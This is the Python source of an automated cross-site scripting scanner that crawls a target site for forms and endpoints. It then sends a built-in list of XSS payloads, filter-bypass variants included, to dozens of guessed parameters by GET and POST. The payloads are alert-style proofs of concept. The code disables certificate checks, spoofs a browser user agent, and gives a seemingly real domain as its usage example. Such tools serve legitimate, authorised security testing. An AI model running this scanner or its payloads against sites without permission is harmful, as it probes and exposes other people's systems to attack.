#!/usr/bin/env python3
"""
Comprehensive XSS Scanner v5.0 - Finds Hidden XSS
Author: ttiimmaa123
Advanced XSS detection with form discovery, crawling, and comprehensive testing
"""

import sys
import requests
import threading
import time
import argparse
import re
import html
from urllib.parse import quote_plus, unquote, urlparse, urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ComprehensiveXSSScanner:
    def __init__(self, threads=5, timeout=10):
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities = []
        self.tested_urls = set()
        self.found_forms = []
        self.found_endpoints = []
        self.lock = threading.Lock()
        
        # Session with realistic headers
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Comprehensive XSS payloads for different contexts
        self.xss_payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>alert(1)</script>",
                "<script>confirm('XSS')</script>",
                "<script>prompt('XSS')</script>",
            ],
            'img_svg': [
                "<img src=x onerror=alert('XSS')>",
                "<img src='x' onerror='alert(1)'>",
                "<svg onload=alert('XSS')>",
                "<svg/onload=alert(1)>",
            ],
            'events': [
                "<input type=text onmouseover=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<button onclick=alert('XSS')>Click</button>",
            ],
            'context_breaking': [
                "'><script>alert('XSS')</script>",
                '"><script>alert("XSS")</script>',
                "</title><script>alert('XSS')</script>",
                "</textarea><script>alert('XSS')</script>",
                "</script><script>alert('XSS')</script>",
            ],
            'javascript_urls': [
                "javascript:alert('XSS')",
                "JAVASCRIPT:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
            ],
            'filter_bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=eval('alert(\\x22XSS\\x22)')>",
                "<svg><script>alert('XSS')</script></svg>",
                "';alert('XSS');//",
                '";alert("XSS");//',
            ],
            'dom_xss': [
                "#<script>alert('XSS')</script>",
                "?callback=alert('XSS')",
                "#q=<img src=x onerror=alert('XSS')>",
                "?jsonp=<script>alert('XSS')</script>",
            ]
        }
        
        # Extended parameter list
        self.test_parameters = [
            # Common parameters
            'q', 'search', 'query', 'keyword', 'term', 'find', 'keywords', 's', 'searchterm',
            'name', 'username', 'user', 'email', 'message', 'comment', 'text', 'content',
            'id', 'value', 'data', 'input', 'body', 'description', 'title', 'subject',
            
            # Form specific parameters
            'fname', 'lname', 'firstname', 'lastname', 'fullname', 'displayname',
            'address', 'city', 'state', 'country', 'phone', 'mobile', 'website',
            'company', 'organization', 'department', 'position', 'role',
            
            # Application specific
            'callback', 'jsonp', 'api', 'ajax', 'action', 'method', 'function',
            'page', 'view', 'mode', 'type', 'category', 'tag', 'filter',
            'url', 'link', 'href', 'src', 'redirect', 'return', 'goto', 'next',
            
            # Debug/test parameters
            'debug', 'test', 'demo', 'example', 'sample', 'trace', 'log',
            'error', 'exception', 'output', 'result', 'response',
            
            # Less common but vulnerable
            'lang', 'language', 'locale', 'charset', 'encoding',
            'theme', 'skin', 'template', 'layout', 'style',
            'ref', 'referer', 'referrer', 'from', 'source'
        ]
    
    def normalize_url(self, target):
        """Normalize URL format"""
        if not target.startswith(('http://', 'https://')):
            return f'https://{target}'
        return target
    
    def test_connectivity(self, url):
        """Test target connectivity"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            return True, response.status_code, url, response
        except requests.exceptions.SSLError:
            http_url = url.replace('https://', 'http://')
            try:
                response = self.session.get(http_url, timeout=self.timeout)
                return True, response.status_code, http_url, response
            except:
                return False, None, None, None
        except Exception:
            return False, None, None, None
    
    def discover_forms(self, url, response_text):
        """Discover forms on the page"""
        try:
            # Simple form discovery without BeautifulSoup
            form_pattern = r'<form[^>]*?action=["\']?([^"\'>\s]*)["\']?[^>]*?>(.*?)</form>'
            input_pattern = r'<(?:input|textarea)[^>]*?name=["\']?([^"\'>\s]+)["\']?[^>]*?(?:type=["\']?([^"\'>\s]*)["\']?)?[^>]*?/?>'
            method_pattern = r'method=["\']?([^"\'>\s]+)["\']?'
            
            forms = re.findall(form_pattern, response_text, re.IGNORECASE | re.DOTALL)
            
            for action, form_content in forms:
                # Get form method
                method_match = re.search(method_pattern, form_content, re.IGNORECASE)
                method = method_match.group(1).upper() if method_match else 'GET'
                
                # Get form action URL
                if action:
                    form_url = urljoin(url, action)
                else:
                    form_url = url
                
                # Get input fields
                inputs = []
                input_matches = re.findall(input_pattern, form_content, re.IGNORECASE)
                for name, input_type in input_matches:
                    if name and input_type.lower() not in ['hidden', 'submit', 'button', 'reset']:
                        inputs.append(name)
                
                if inputs:
                    form_data = {
                        'url': form_url,
                        'method': method,
                        'inputs': inputs,
                        'form_html': form_content[:200]
                    }
                    self.found_forms.append(form_data)
                    print(f"    📝 Found form: {method} {form_url} with inputs: {inputs}")
        
        except Exception as e:
            pass
    
    def discover_endpoints(self, url, response_text):
        """Discover additional endpoints with parameters"""
        try:
            # Find URLs with query parameters
            url_pattern = r'(?:href|src|action)=["\']([^"\']+\?[^"\']+)["\']'
            matches = re.findall(url_pattern, response_text, re.IGNORECASE)
            
            for match in matches:
                full_url = urljoin(url, match)
                if full_url not in self.found_endpoints and urlparse(full_url).netloc == urlparse(url).netloc:
                    self.found_endpoints.append(full_url)
                    print(f"    🔍 Found endpoint: {full_url}")
        
        except Exception:
            pass
    
    def analyze_xss_reflection(self, response_text, payload):
        """Advanced XSS reflection analysis"""
        if not response_text or payload not in response_text:
            return False, "Payload not reflected"
        
        # Check for HTML encoding (safe)
        html_encoded = html.escape(payload)
        if html_encoded in response_text and html_encoded != payload:
            return False, "Payload HTML encoded"
        
        # Check for script tag removal
        if '<script>' in payload.lower():
            no_script = payload.replace('<script>', '').replace('</script>', '')
            if no_script in response_text and '<script>' not in response_text:
                return False, "Script tags removed"
        
        # Check for dangerous function removal
        if 'alert(' in payload.lower():
            no_alert = re.sub(r'alert\s*\([^)]*\)', '', payload, flags=re.IGNORECASE)
            if no_alert in response_text and 'alert(' not in response_text.lower():
                return False, "Alert function removed"
        
        # Look for execution contexts
        payload_index = response_text.find(payload)
        if payload_index > -1:
            start = max(0, payload_index - 100)
            end = min(len(response_text), payload_index + len(payload) + 100)
            context = response_text[start:end]
            
            # Check for executable contexts
            if re.search(r'<script[^>]*>.*?' + re.escape(payload), response_text, re.IGNORECASE | re.DOTALL):
                return True, "Payload in script context"
            
            if re.search(r'on\w+\s*=\s*["\']?[^"\']*' + re.escape(payload), response_text, re.IGNORECASE):
                return True, "Payload in event handler"
            
            if 'javascript:' in payload.lower() and 'javascript:' in context.lower():
                return True, "JavaScript URL injection"
            
            # Check if in non-executable context
            safe_contexts = ['<!--', '<title>', '<noscript>', '<textarea>', '<pre>', '<code>']
            for safe_ctx in safe_contexts:
                if safe_ctx.lower() in context.lower():
                    return False, f"Payload in safe context: {safe_ctx}"
        
        # If payload appears unmodified, consider it potentially vulnerable
        return True, "Payload reflected unfiltered - needs manual verification"
    
    def test_parameter_xss(self, base_url, param, payload, method='GET'):
        """Test parameter for XSS"""
        try:
            if method.upper() == 'GET':
                encoded_payload = quote_plus(payload)
                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={encoded_payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                display_url = test_url
            else:
                data = {param: payload}
                response = self.session.post(base_url, data=data, timeout=self.timeout)
                display_url = base_url
            
            # Analyze reflection
            is_reflected, analysis = self.analyze_xss_reflection(response.text, payload)
            
            if is_reflected and "unfiltered" in analysis:
                vulnerability = {
                    'type': f'{method.upper()} Parameter XSS',
                    'url': display_url,
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'analysis': analysis,
                    'status_code': response.status_code,
                    'confidence': 'High' if 'script context' in analysis or 'event handler' in analysis else 'Medium'
                }
                
                with self.lock:
                    self.vulnerabilities.append(vulnerability)
                    print(f"    🚨 POTENTIAL XSS: {param} ({method}) - {analysis}")
                    print(f"        Payload: {payload[:50]}...")
                    print(f"        URL: {display_url[:80]}...")
                
                return True
            else:
                if "not reflected" not in analysis:  # Only show non-reflection issues
                    print(f"    ✅ Safe: {param} - {analysis}")
            
        except Exception as e:
            pass
        
        return False
    
    def test_form_xss(self, form_data):
        """Test form for XSS vulnerabilities"""
        print(f"    🔍 Testing form: {form_data['method']} {form_data['url']}")
        
        # Get basic payloads for form testing
        basic_payloads = self.xss_payloads['basic'] + self.xss_payloads['img_svg']
        
        for payload in basic_payloads[:3]:  # Test first 3 payloads
            for input_name in form_data['inputs']:
                try:
                    # Prepare form data
                    form_data_dict = {}
                    for inp in form_data['inputs']:
                        if inp == input_name:
                            form_data_dict[inp] = payload
                        else:
                            form_data_dict[inp] = 'test'
                    
                    if form_data['method'] == 'GET':
                        params = '&'.join([f"{k}={quote_plus(v)}" for k, v in form_data_dict.items()])
                        test_url = f"{form_data['url']}?{params}"
                        response = self.session.get(test_url, timeout=self.timeout)
                        display_url = test_url
                    else:
                        response = self.session.post(form_data['url'], data=form_data_dict, timeout=self.timeout)
                        display_url = form_data['url']
                    
                    # Analyze reflection
                    is_reflected, analysis = self.analyze_xss_reflection(response.text, payload)
                    
                    if is_reflected and "unfiltered" in analysis:
                        vulnerability = {
                            'type': 'Form XSS',
                            'url': display_url,
                            'parameter': input_name,
                            'payload': payload,
                            'method': form_data['method'],
                            'analysis': analysis,
                            'form_action': form_data['url'],
                            'confidence': 'High'
                        }
                        
                        with self.lock:
                            self.vulnerabilities.append(vulnerability)
                            print(f"        🚨 FORM XSS FOUND: {input_name}")
                            print(f"            Payload: {payload}")
                            print(f"            Analysis: {analysis}")
                        
                        return True
                
                except Exception:
                    continue
        
        return False
    
    def test_dom_xss(self, base_url):
        """Test for DOM-based XSS"""
        print(f"    🔍 Testing DOM XSS...")
        
        dom_payloads = self.xss_payloads['dom_xss']
        
        for payload in dom_payloads:
            try:
                test_url = base_url + payload
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Look for DOM XSS patterns
                dom_patterns = [
                    r'document\.write\s*\(',
                    r'\.innerHTML\s*=',
                    r'eval\s*\(',
                    r'location\.hash',
                    r'window\.location',
                    r'document\.URL'
                ]
                
                payload_clean = payload.replace('#', '').replace('?', '').split('=')[-1]
                
                for pattern in dom_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE) and payload_clean in response.text:
                        vulnerability = {
                            'type': 'DOM XSS',
                            'url': test_url,
                            'payload': payload,
                            'pattern': pattern,
                            'method': 'DOM',
                            'confidence': 'High'
                        }
                        
                        with self.lock:
                            self.vulnerabilities.append(vulnerability)
                            print(f"        🚨 DOM XSS FOUND!")
                            print(f"            URL: {test_url}")
                            print(f"            Pattern: {pattern}")
                        
                        return True
            
            except Exception:
                continue
        
        return False
    
    def run_comprehensive_scan(self, target):
        """Execute comprehensive XSS scan"""
        url = self.normalize_url(target)
        
        print("=" * 80)
        print("🔍 COMPREHENSIVE XSS SCANNER v5.0 - FINDS HIDDEN XSS")
        print("=" * 80)
        print("🎯 Advanced XSS detection with form discovery and crawling")
        print("🔍 Tests multiple contexts and injection points")
        print("📝 Discovers forms and endpoints automatically")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print(f"🔗 URL: {url}")
        print("-" * 80)
        
        # Test connectivity and get initial page
        print("[+] Testing connectivity and analyzing page...")
        reachable, status, final_url, response = self.test_connectivity(url)
        
        if not reachable:
            print("[!] ❌ ERROR: Target unreachable!")
            return []
        
        url = final_url
        print(f"[+] ✅ Target reachable! (Status: {status})")
        
        # Phase 1: Form Discovery
        print(f"[+] Phase 1: Form Discovery")
        self.discover_forms(url, response.text)
        print(f"[+] Found {len(self.found_forms)} forms")
        
        # Phase 2: Endpoint Discovery
        print(f"[+] Phase 2: Endpoint Discovery")
        self.discover_endpoints(url, response.text)
        print(f"[+] Found {len(self.found_endpoints)} endpoints")
        
        # Phase 3: Parameter Testing
        print(f"[+] Phase 3: Parameter Testing")
        print(f"[+] Testing {len(self.test_parameters)} parameters with multiple payloads")
        
        all_payloads = []
        for category in self.xss_payloads.values():
            all_payloads.extend(category)
        
        tested_count = 0
        total_param_tests = len(self.test_parameters) * len(all_payloads[:10]) * 2  # GET + POST
        
        for param in self.test_parameters:
            for payload in all_payloads[:10]:  # Test first 10 payloads
                tested_count += 1
                if tested_count % 20 == 0:
                    progress = (tested_count / total_param_tests) * 100
                    print(f"[+] Parameter testing progress: {progress:.1f}%")
                
                # Test GET
                self.test_parameter_xss(url, param, payload, 'GET')
                # Test POST  
                self.test_parameter_xss(url, param, payload, 'POST')
        
        # Phase 4: Form Testing
        if self.found_forms:
            print(f"[+] Phase 4: Form Testing")
            for form in self.found_forms:
                self.test_form_xss(form)
        
        # Phase 5: Endpoint Testing
        if self.found_endpoints:
            print(f"[+] Phase 5: Additional Endpoint Testing")
            for endpoint in self.found_endpoints[:5]:  # Test first 5 endpoints
                for param in ['q', 'search', 'test']:
                    for payload in all_payloads[:5]:
                        self.test_parameter_xss(endpoint, param, payload, 'GET')
        
        # Phase 6: DOM XSS Testing
        print(f"[+] Phase 6: DOM XSS Testing")
        self.test_dom_xss(url)
        
        # Generate comprehensive report
        self.generate_comprehensive_report(target)
        
        return self.vulnerabilities
    
    def generate_comprehensive_report(self, target):
        """Generate comprehensive vulnerability report"""
        print("\n" + "=" * 80)
        print("📋 COMPREHENSIVE XSS SCAN RESULTS")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print(f"🕒 Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"📝 Forms discovered: {len(self.found_forms)}")
        print(f"🔍 Endpoints discovered: {len(self.found_endpoints)}")
        print("-" * 80)
        
        if self.vulnerabilities:
            print(f"🚨 POTENTIAL XSS VULNERABILITIES FOUND: {len(self.vulnerabilities)}")
            
            # Categorize vulnerabilities
            high_confidence = [v for v in self.vulnerabilities if v.get('confidence') == 'High']
            medium_confidence = [v for v in self.vulnerabilities if v.get('confidence') == 'Medium']
            
            print(f"🔴 High Confidence: {len(high_confidence)}")
            print(f"🟡 Medium Confidence: {len(medium_confidence)}")
            print("-" * 80)
            
            # Show all findings
            for i, vuln in enumerate(self.vulnerabilities, 1):
                conf_icon = "🔴" if vuln.get('confidence') == 'High' else "🟡"
                param_name = vuln.get('parameter', 'N/A')
                
                print(f"\n[{i}] {conf_icon} {vuln['type']}")
                print(f"    Parameter: {param_name}")
                print(f"    Method: {vuln.get('method', 'N/A')}")
                print(f"    Payload: {vuln['payload']}")
                print(f"    Analysis: {vuln.get('analysis', 'N/A')}")
                print(f"    URL: {vuln['url']}")
                
                if vuln['type'] == 'Form XSS':
                    print(f"    Form Action: {vuln.get('form_action', 'N/A')}")
                
                print(f"    🧪 MANUAL TEST: Copy URL to browser and check for execution")
            
            print(f"\n🔍 MANUAL VERIFICATION STEPS:")
            print(f"   1. Copy each URL to your browser")
            print(f"   2. Look for JavaScript alert/prompt/confirm boxes")
            print(f"   3. Check browser developer console for errors")
            print(f"   4. Verify the payload actually executes")
            
            print(f"\n🛡️  SECURITY RECOMMENDATIONS:")
            print(f"   • Implement comprehensive input validation")
            print(f"   • Apply context-aware output encoding")
            print(f"   • Deploy Content Security Policy (CSP)")
            print(f"   • Regular security testing and code review")
            
        else:
            print(f"✅ NO XSS VULNERABILITIES DETECTED")
            print(f"🟢 Comprehensive scan completed successfully")
            
            print(f"\n📊 SCAN COVERAGE:")
            print(f"   ✅ {len(self.test_parameters)} parameters tested")
            print(f"   ✅ {len(self.found_forms)} forms analyzed")
            print(f"   ✅ {len(self.found_endpoints)} endpoints discovered")
            print(f"   ✅ Multiple payload categories tested")
            print(f"   ✅ GET, POST, Form, and DOM XSS testing")
        
        print("\n" + "=" * 80)
        print("🔍 COMPREHENSIVE SCAN COMPLETED")
        print("💡 Manual verification recommended for all findings")
        print("=" * 80)

def main():
    print("\n🔍 COMPREHENSIVE XSS SCANNER v5.0")
    print("Advanced XSS Detection - Finds Hidden Vulnerabilities")
    print("Author: ttiimmaa123")
    print("━" * 60)
    print("✅ Form discovery and testing")
    print("✅ Endpoint discovery and crawling")
    print("✅ Multiple injection contexts")
    print("✅ DOM XSS detection")
    print("✅ Comprehensive parameter testing")
    print("━" * 60)
    
    parser = argparse.ArgumentParser(description='Comprehensive XSS Scanner')
    parser.add_argument('target', help='Target to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout (default: 10)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExamples:")
        print("  python3 xss_scanner.py http://support.crestfield.com")
        print("  python3 xss_scanner.py https://example.com --threads 8")
        sys.exit(0)
    
    args = parser.parse_args()
    scanner = ComprehensiveXSSScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        vulnerabilities = scanner.run_comprehensive_scan(args.target)
        
        if vulnerabilities:
            high_conf = [v for v in vulnerabilities if v.get('confidence') == 'High']
            if high_conf:
                print(f"\n🔴 {len(high_conf)} high confidence findings")
                sys.exit(1)
            else:
                print(f"\n🟡 {len(vulnerabilities)} potential findings")
                sys.exit(1)
        else:
            print(f"\n✅ No XSS vulnerabilities detected")
            sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
        sys.exit(2)
    except Exception as error:
        print(f"\n[!] Error: {error}")
        sys.exit(3)

if __name__ == '__main__':
    main()
